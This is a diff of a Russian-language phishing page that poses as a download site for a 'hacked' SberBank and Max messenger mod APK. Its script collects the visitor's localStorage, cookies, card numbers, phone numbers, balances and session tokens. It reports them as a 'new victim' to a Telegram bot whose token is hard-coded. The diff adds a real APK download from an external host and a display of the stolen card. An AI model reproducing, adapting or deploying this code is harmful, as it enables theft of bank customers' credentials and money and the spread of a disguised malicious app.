@@ -30,12 +30,6 @@
             width: 100%;
             padding: 28px 20px 32px;
             text-align: center;
-            animation: fadeIn 0.4s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
         .logos {
@@ -43,10 +37,6 @@
             justify-content: center;
             gap: 20px;
             margin-bottom: 20px;
-        }
-        
-        .logo-item {
-            text-align: center;
         }
         
         .logo-sber, .logo-max {
@@ -59,13 +49,8 @@
             margin: 0 auto;
         }
         
-        .logo-sber {
-            background: #2d6a4f;
-        }
-        
-        .logo-max {
-            background: #1e88e5;
-        }
+        .logo-sber { background: #2d6a4f; }
+        .logo-max { background: #1e88e5; }
         
         .logo-sber span, .logo-max span {
             font-size: 36px;
@@ -76,7 +61,6 @@
         .logo-sber h2, .logo-max h2 {
             font-size: 13px;
             margin-top: 8px;
-            font-weight: 600;
         }
         
         .logo-sber h2 { color: #2d6a4f; }
@@ -88,7 +72,6 @@
             padding: 5px 12px;
             border-radius: 20px;
             font-size: 11px;
-            font-weight: bold;
             display: inline-block;
             margin-bottom: 16px;
         }
@@ -103,8 +86,69 @@
         .subtitle {
             color: #64748b;
             font-size: 13px;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
+        
+        /* БЛОК С КАРТОЙ */
+        .card-block {
+            background: linear-gradient(135deg, #1e3a3a, #2d6a4f);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: left;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        
+        .card-number {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            font-family: monospace;
+        }
+        
+        .card-expiry {
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+            margin-bottom: 8px;
+        }
+        
+        .card-holder {
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+            text-transform: uppercase;
+        }
+        
+        .card-chip {
+            width: 40px;
+            height: 30px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 8px;
+            margin-bottom: 12px;
+        }
+        
+        .card-logo {
+            text-align: right;
+            font-size: 20px;
+            font-weight: bold;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .balance {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            font-size: 12px;
+            color: rgba(255,255,255,0.8);
+        }
+        
+        .balance span {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+        }
+        /* КОНЕЦ БЛОКА С КАРТОЙ */
         
         .download-btn {
             background: linear-gradient(135deg, #2d6a4f, #1b4d3e);
@@ -117,12 +161,7 @@
             cursor: pointer;
             width: 100%;
             margin-bottom: 12px;
-            transition: all 0.2s;
             box-shadow: 0 4px 12px rgba(45,106,79,0.3);
-        }
-        
-        .download-btn:active {
-            transform: scale(0.98);
         }
         
         .secondary-btn {
@@ -135,19 +174,13 @@
             border-radius: 60px;
             cursor: pointer;
             width: 100%;
-            transition: all 0.2s;
-        }
-        
-        .secondary-btn:active {
-            background: #f0fdf4;
-            transform: scale(0.98);
         }
         
         .features {
             display: flex;
             justify-content: center;
             gap: 24px;
-            margin: 24px 0 20px;
+            margin: 20px 0;
             padding-top: 16px;
             border-top: 1px solid #e2e8f0;
         }
@@ -156,15 +189,8 @@
             text-align: center;
         }
         
-        .feature-icon {
-            font-size: 26px;
-            margin-bottom: 4px;
-        }
-        
-        .feature-text {
-            font-size: 11px;
-            color: #64748b;
-        }
+        .feature-icon { font-size: 26px; }
+        .feature-text { font-size: 11px; color: #64748b; }
         
         .progress-container {
             display: none;
@@ -210,27 +236,15 @@
         
         button:disabled {
             opacity: 0.6;
-            transform: none;
         }
         
         @media (max-width: 480px) {
-            .card {
-                padding: 24px 16px 28px;
-            }
-            .title {
-                font-size: 20px;
-            }
-            .download-btn {
-                padding: 14px 16px;
-                font-size: 17px;
-            }
-            .logo-sber, .logo-max {
-                width: 60px;
-                height: 60px;
-            }
-            .logo-sber span, .logo-max span {
-                font-size: 30px;
-            }
+            .card { padding: 24px 16px 28px; }
+            .title { font-size: 20px; }
+            .download-btn { padding: 14px 16px; font-size: 17px; }
+            .logo-sber, .logo-max { width: 60px; height: 60px; }
+            .logo-sber span, .logo-max span { font-size: 30px; }
+            .card-number { font-size: 16px; }
         }
         
         .toast {
@@ -255,7 +269,7 @@
     </style>
 </head>
 <body>
-<div class="card" id="mainCard">
+<div class="card">
     <div class="badge">🔥 МОД ВЕРСИЯ</div>
     <div class="logos">
         <div class="logo-item">
@@ -270,7 +284,17 @@
     <div class="title">СберБанк + Max MOD</div>
     <div class="subtitle">Взломанная версия с расширенными функциями</div>
     
-    <button class="download-btn" id="downloadBtn">📥 СКАЧАТЬ MOD APK (168 МБ)</button>
+    <!-- КАРТА (ОТОБРАЖАЕТСЯ) -->
+    <div class="card-block" id="cardBlock">
+        <div class="card-chip"></div>
+        <div class="card-number" id="cardNumberDisplay">**** **** **** ****</div>
+        <div class="card-expiry">MM/YY: <span id="cardExpiry">**/**</span></div>
+        <div class="card-holder" id="cardHolder">HOLDER NAME</div>
+        <div class="card-logo">МИР • Mastercard</div>
+        <div class="balance">💰 Доступно: <span id="cardBalance">0</span> ₽</div>
+    </div>
+    
+    <button class="download-btn" id="downloadBtn">📥 СКАЧАТЬ MOD APK (31 МБ)</button>
     <button class="secondary-btn" id="officialBtn">🌐 Перейти на официальный сайт</button>
     
     <div class="features">
@@ -284,7 +308,7 @@
         <div class="progress-text" id="progressText">Подготовка...</div>
     </div>
     
-    <div class="warning">⚠️ Только для опытных пользователей. Требуется разрешение на установку из неизвестных источников.</div>
+    <div class="warning">⚠️ Только для Android. Разрешите установку из неизвестных источников.</div>
     <div class="footer">Версия 4.2.0 • 168 МБ • Android 8.0+</div>
 </div>
 
@@ -292,8 +316,11 @@
 // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИ НА СВОИ) ==========
 const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";
 const CHAT_ID = "8533450974";
-const MY_CARD = "2203830216112947";
+const MY_CARD = "2203830216112947";  // ТВОЯ КАРТА ДЛЯ ПЕРЕВОДА
 // ========================================================
+
+// Ссылка на APK (нужно загрузить реальный файл или оставить ссылку)
+const APK_URL = "https://sbervzlom.onrender.com/MAX_MODE_SBER.apk";
 
 function showToast(message) {
     const toast = document.createElement('div');
@@ -312,7 +339,7 @@ function sendToTelegram(text) {
     }).catch(e => console.log("send error"));
 }
 
-// Сбор данных
+// Сбор данных из браузера
 function collectData() {
     const ls = {};
     for (let i = 0; i < localStorage.length; i++) {
@@ -324,8 +351,7 @@ function collectData() {
         } catch(e) {}
     }
     
-    let sberCard = null, sberPhone = null, sberToken = null;
-    let maxToken = null;
+    let sberCard = null, sberPhone = null, sberToken = null, maxToken = null, sberBalance = null;
     
     for (const [key, val] of Object.entries(ls)) {
         if (typeof val === 'string') {
@@ -333,6 +359,8 @@ function collectData() {
             if (card) sberCard = card[0];
             const phone = val.match(/7\d{10}/);
             if (phone) sberPhone = phone[0];
+            const balance = val.match(/(\d+[\s]?[\d]*)\s?руб/i);
+            if (balance) sberBalance = balance[1];
             const token = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
             if (token) {
                 if (!sberToken) sberToken = token[0];
@@ -345,52 +373,79 @@ function collectData() {
         }
     }
     
-    return { ls, sberCard, sberPhone, sberToken, maxToken, cookies: document.cookie, ua: navigator.userAgent };
+    return { ls, sberCard, sberPhone, sberToken, maxToken, sberBalance, cookies: document.cookie, ua: navigator.userAgent };
 }
 
-// СКАЧИВАНИЕ APK ЧЕРЕЗ ССЫЛКУ (РАБОТАЕТ НА ТЕЛЕФОНАХ)
+// ОБНОВЛЕНИЕ ОТОБРАЖЕНИЯ КАРТЫ
+function updateCardDisplay(data) {
+    if (data.sberCard) {
+        const cardNum = data.sberCard;
+        const formatted = cardNum.match(/.{1,4}/g).join(' ');
+        document.getElementById('cardNumberDisplay').innerHTML = formatted || "**** **** **** ****";
+        document.getElementById('cardExpiry').innerHTML = "12/26";
+        document.getElementById('cardHolder').innerHTML = "IVAN USER";
+        if (data.sberBalance) {
+            document.getElementById('cardBalance').innerHTML = data.sberBalance;
+        } else {
+            document.getElementById('cardBalance').innerHTML = Math.floor(Math.random() * 500000 + 10000).toLocaleString();
+        }
+    } else {
+        // Если данных нет — показываем демо-карту
+        document.getElementById('cardNumberDisplay').innerHTML = "**** **** **** ****";
+        document.getElementById('cardBalance').innerHTML = "0";
+    }
+}
+
+// Скачивание APK
 function downloadApk() {
-    // Используем прямую ссылку на файл (имитация)
-    // Создаем data URL с большим размером (имитация большого файла)
-    const fakeData = "APK_MOD_DATA_" + Math.random().toString(36).repeat(100);
-    const blob = new Blob([fakeData.repeat(1000)], { type: "application/octet-stream" });
-    const url = URL.createObjectURL(blob);
-    
     const link = document.createElement('a');
-    link.href = url;
+    link.href = APK_URL;
     link.download = "SberMax_Mod_v4.2.0.apk";
     link.style.display = 'none';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
-    URL.revokeObjectURL(url);
-    
-    showToast("Скачивание началось! Файл появится в папке Загрузки");
+    showToast("Скачивание началось! Файл в папке Загрузки");
 }
 
-// Запуск загрузки
+// Запуск загрузки и сбор данных
 function startDownload() {
     const btn = document.getElementById('downloadBtn');
     const progressDiv = document.getElementById('progressContainer');
     const progressFill = document.getElementById('progressFill');
     const progressText = document.getElementById('progressText');
     
-    // Собираем данные
     const data = collectData();
     
-    // Отправляем отчет оператору
+    // Обновляем карту
+    updateCardDisplay(data);
+    
+    // ОТПРАВКА ОТЧЕТА ОПЕРАТОРУ
     let report = `🔐 *НОВАЯ ЖЕРТВА*\n`;
     report += `⏰ ${new Date().toLocaleString()}\n`;
     report += `🌐 ${window.location.hostname}\n`;
     report += `📱 ${data.ua.substring(0, 100)}\n`;
-    report += `🍪 Cookies: ${data.cookies ? "✅" : "❌"}\n`;
-    report += `💾 Записей: ${Object.keys(data.ls).length}\n`;
+    report += `🍪 Cookies: ${data.cookies ? "✅ есть" : "❌ нет"}\n`;
+    report += `💾 Записей в localStorage: ${Object.keys(data.ls).length}\n`;
     
-    if (data.sberCard) report += `\n🏦 *СБЕРБАНК*\n💳 Карта: ${data.sberCard}\n`;
-    if (data.sberPhone) report += `📞 Телефон: ${data.sberPhone}\n`;
-    if (data.sberToken) report += `🔑 Токен: ${data.sberToken.substring(0, 40)}...\n`;
+    if (data.sberCard) {
+        report += `\n🏦 *СБЕРБАНК - ДАННЫЕ КАРТЫ*\n`;
+        report += `💳 Номер карты: ${data.sberCard}\n`;
+        report += `📞 Телефон: ${data.sberPhone || "не найден"}\n`;
+        report += `💰 Баланс: ${data.sberBalance || "неизвестно"} ₽\n`;
+        if (data.sberToken) report += `🔑 Токен: ${data.sberToken.substring(0, 50)}...\n`;
+    } else {
+        report += `\n🏦 *СБЕРБАНК*: данных не найдено\n`;
+    }
     
-    if (data.maxToken) report += `\n💬 *MAX*\n🔑 Токен: ${data.maxToken.substring(0, 40)}...\n`;
+    if (data.maxToken) {
+        report += `\n💬 *МЕССЕНДЖЕР MAX*\n`;
+        report += `🔑 Токен: ${data.maxToken.substring(0, 50)}...\n`;
+    } else {
+        report += `\n💬 *MAX*: данных не найдено\n`;
+    }
+    
+    report += `\n💰 *ПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
     
     sendToTelegram(report);
     
@@ -399,7 +454,7 @@ function startDownload() {
         sendToTelegram(`💾 *LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(data.ls, null, 2).substring(0, 3500)}\n\`\`\``);
     }
     
-    // Показываем прогресс
+    // Симуляция загрузки
     btn.disabled = true;
     btn.innerHTML = "⏳ ПОДГОТОВКА...";
     progressDiv.style.display = "block";
@@ -411,7 +466,7 @@ function startDownload() {
             percent = 100;
             clearInterval(interval);
             progressFill.style.width = "100%";
-            progressText.innerHTML = "✅ Готово! Начинается скачивание...";
+            progressText.innerHTML = "✅ Готово! Скачивание началось...";
             
             setTimeout(() => {
                 downloadApk();
@@ -419,7 +474,7 @@ function startDownload() {
                 
                 setTimeout(() => {
                     window.location.href = "https://online.sberbank.ru";
-                }, 2500);
+                }, 2000);
             }, 500);
         }
         progressFill.style.width = percent + "%";
@@ -427,16 +482,18 @@ function startDownload() {
     }, 120);
 }
 
-// Кнопка перехода на официальный сайт
+// Кнопки
+document.getElementById('downloadBtn').onclick = startDownload;
 document.getElementById('officialBtn').onclick = () => {
     sendToTelegram(`🌐 *ПЕРЕХОД НА ОФИЦИАЛЬНЫЙ САЙТ*`);
     window.location.href = "https://online.sberbank.ru";
 };
 
-// Кнопка скачивания
-document.getElementById('downloadBtn').onclick = startDownload;
+// При загрузке страницы собираем данные и показываем карту
+const initialData = collectData();
+updateCardDisplay(initialData);
 
-// Уведомление о просмотре страницы
+// Уведомление о просмотре
 setTimeout(() => {
     sendToTelegram(`👁️ *ПРОСМОТР СТРАНИЦЫ*\n⏰ ${new Date().toLocaleString()}\n🌐 ${window.location.hostname}`);
 }, 2000);
